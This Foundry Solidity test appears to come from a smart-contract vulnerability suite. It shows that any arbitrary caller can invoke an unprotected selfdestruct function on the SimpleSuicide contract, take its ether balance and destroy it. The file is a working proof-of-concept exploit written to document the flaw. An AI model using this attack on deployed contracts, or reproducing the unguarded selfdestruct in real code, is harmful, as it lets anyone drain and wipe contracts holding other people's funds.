
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleSuicide} from "../src/SimpleSuicide.sol";

contract TestAccessControlSimpleSuicide is Test {
    SimpleSuicide public simpleSuicide;

    function setUp() public {
        simpleSuicide = new SimpleSuicide();
        // Fund the contract so we can verify funds are transferred on selfdestruct
        vm.deal(address(simpleSuicide), 1 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // The SimpleSuicide contract has NO privileged roles defined.
        // There is no owner, admin, or any access control mechanism.
        // Therefore, no addresses need to be excluded as "authorized".

        // --- 2. State Configuration ---
        // Record the caller's balance before the attack
        uint256 callerBalanceBefore = caller.balance;
        uint256 contractBalance = address(simpleSuicide).balance;

        // --- 3. Execution & Assertion ---
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        // Any arbitrary user can call sudicideAnyone() and destroy the contract,
        // receiving all its funds. This is a critical vulnerability.
        simpleSuicide.sudicideAnyone();

        // ASSERT SUCCESS - Verify the selfdestruct occurred
        // The caller should have received the contract's balance
        assertEq(caller.balance, callerBalanceBefore + contractBalance, "Caller should receive contract funds");
        
        // Verify the contract code is destroyed (code size becomes 0 after selfdestruct)
        uint256 codeSize;
        address target = address(simpleSuicide);
        assembly {
            codeSize := extcodesize(target)
        }
        assertEq(codeSize, 0, "Contract should be destroyed");
    }
}
